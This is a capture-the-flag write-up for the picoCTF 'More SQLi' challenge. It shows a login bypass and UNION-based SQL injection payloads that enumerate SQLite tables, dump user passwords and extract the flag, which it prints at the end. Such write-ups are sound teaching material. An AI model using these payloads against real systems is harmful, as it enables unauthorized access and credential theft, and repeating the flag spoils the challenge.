# More SQLi ❓

**Tags:** Web Exploitation

**Point:** 200 points

**Description:** 
Can you find the flag on this website.
Additional details will be available after launching your challenge instance.

### Solution: 💯

For the first login page, we can easily bypass with 

> Username: `anystring`
> Password: `' or 1=1 --`

Then we access "Search city" website, this box is also vulnerable to SQLi too.

We try to find the table that contains the flag, we often retrieve data columns or rows by `UNION`, quick test with this payload. 

```
Algiers' UNION SELECT 1, sqlite_version(), 3;--
```

<p align="center">
    <img src="/Web/picoCTF/More SQLi/img/image1.png">
</p>

> With testing by adding some "null" in SELECT, we can found out that the query behind backend should return 3 columns, if not , UI would return empty, this indicates errors when querying.

That proves it works! Now then try to retrieve all tables in DB.

```
Algiers' union select name, tbl_name, null from sqlite_master; --
```

<p align="center">
    <img src="/Web/picoCTF/More SQLi/img/image2.png">
</p>

In the output, there is a table named `users`, this is interesting. Let's find columns existing in it.

```
Algiers' union SELECT name, type, pk from pragma_table_info('users'); --
```

<p align="center">
    <img src="/Web/picoCTF/More SQLi/img/image3.png">
</p>


Columns `name` and `password` exists, now retrieve the data

```
Algiers' union SELECT id, name, password from users; --
```

<p align="center">
    <img src="/Web/picoCTF/More SQLi/img/image4.png">
</p>

Then we can finally get the credential for `admin` user. Log out and log in with these information. But it seems not work. So let's work on other existing tables. 

After spending a few minutes, table `hints` is not relevant. But table `more_table` has a column named `flag`

<p align="center">
    <img src="/Web/picoCTF/More SQLi/img/image5.png">
</p>

Let's read it with:

```
Algiers' union SELECT id, flag, null from more_table; --
```

There you're done!

#### The Flag (for reference): ✔️
```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_e3e46aae}	
```





